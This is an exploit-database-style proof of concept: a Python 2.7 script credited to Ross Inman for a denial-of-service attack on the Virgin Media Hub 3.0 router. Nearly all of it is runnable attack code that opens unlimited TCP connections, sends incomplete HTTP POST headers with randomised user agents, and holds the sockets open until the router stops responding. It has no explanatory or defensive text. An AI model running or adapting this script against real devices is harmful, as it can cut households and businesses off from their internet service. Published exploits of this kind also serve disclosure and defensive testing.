# Exploit Title: Virgin Media Hub 3.0 Router - Denial of Service (PoC)
# Google Dork: N/A
# Date: 2018-11-03
# Exploit Author: Ross Inman
# Vendor Homepage: https://www.broadbandchoices.co.uk/guides/hardware/virgin-media-broadband-routers
# Software Link: N/A
# Version: Virgin Media Hub 3.0
# Tested on: Linux
# CVE : N/A

#!/usr/bin/python2.7

import socket, sys, random, os

user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
]

def connection(ip,port):
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.settimeout(1)
	test = s.connect_ex((ip,port))
	s.close()
	if(test == 0):
		return True
	else:
		return False

def dos(ip,port):
	socks = []
	payload = """
POST / HTTP/1.1\
Host: {}
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: {}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, sdch
Accept-Language: en-GB,en-US;q=0.8,en;q=0.6
        """.format(ip,random.choice(user_agents))
	with open("/tmp/payload.txt","w") as f:
		f.write(payload)
		f.close()
	with open("/tmp/payload.txt","r") as f:
		lines = f.readlines()
		f.close()
	os.remove("/tmp/payload.txt")
	while(True):
		try:
			sys.stdout.write("\r[Info]Sending packets => {}".format(ip))
			s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			s.connect((ip,port))
			for line in lines:
				s.send(line)
			socks.append(s)
		except KeyboardInterrupt:
			print"\n[Info]Closing connections..."
			for sock in socks:
				sock.close()
				socks.remove(sock)
			sys.exit(0)

def main():
	if(len(sys.argv) != 3):
		sys.exit("Usage: ./dos.py {target ip} {port}")
	else:
		target = sys.argv[1]
		port = int(sys.argv[2])
	print"[Info]Checking connection to target..."
	check = connection(target,port)
	if(not check):
		sys.exit("[Failure]Connection to target failed.")
	print"[Info]Starting attack on: {}".format(target)
	dos(target,port)

if(__name__ == "__main__"):
	main()